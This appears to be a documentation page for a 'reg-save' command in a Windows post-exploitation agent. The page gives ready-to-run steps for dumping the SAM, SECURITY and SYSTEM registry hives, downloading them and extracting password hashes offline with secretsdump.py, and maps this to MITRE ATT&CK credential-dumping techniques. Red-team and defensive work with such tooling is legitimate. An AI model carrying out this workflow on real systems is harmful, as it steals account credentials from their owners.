+++
title = "reg-save"
chapter = false
weight = 158
hidden = false
+++

## Summary

Export registry hives to files for offline credential extraction. The `creds` action provides a one-step export of SAM, SECURITY, and SYSTEM hives — the standard set needed for offline hash extraction with tools like `secretsdump.py`.

{{% notice info %}}Windows Only{{% /notice %}}

{{% notice warning %}}Requires SYSTEM privileges. Use `getsystem` before running this command.{{% /notice %}}

## Arguments

| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| action | Yes | save | `save` — export a specific hive/key; `creds` — export SAM+SECURITY+SYSTEM |
| hive | No | HKLM | Registry hive root (HKLM, HKCU, HKCR, HKU). For `save` action only. |
| path | No | — | Registry path to export (e.g., SAM, SECURITY, SYSTEM). For `save` action only. |
| output | No | C:\Windows\Temp | Output file path (for `save`) or directory (for `creds`). |

## Usage

### Export credential hives (recommended)
```
reg-save -action creds
```
Exports SAM, SECURITY, and SYSTEM hives to `C:\Windows\Temp\{sam,security,system}.hiv`.

### Export to custom directory
```
reg-save -action creds -output C:\Temp
```

### Export a specific hive
```
reg-save -action save -hive HKLM -path SAM -output C:\Temp\sam.hiv
```

### Offline extraction workflow
```
reg-save -action creds -output C:\Temp
download C:\Temp\sam.hiv
download C:\Temp\security.hiv
download C:\Temp\system.hiv
# Then locally:
# secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL
```

## MITRE ATT&CK Mapping

- **T1003.002** — OS Credential Dumping: Security Account Manager
- **T1003.004** — OS Credential Dumping: LSA Secrets

## Notes

- Uses `RegSaveKeyExW` API with backup semantics (REG_OPTION_BACKUP_RESTORE)
- Automatically enables SeBackupPrivilege before export
- Output files are overwritten if they already exist
- The `creds` action provides the same output as `reg save HKLM\SAM`, `reg save HKLM\SECURITY`, `reg save HKLM\SYSTEM` but in a single command
- Complements `hashdump` (live SAM extraction) and `lsa-secrets` (live LSA extraction) for cases where offline analysis is preferred
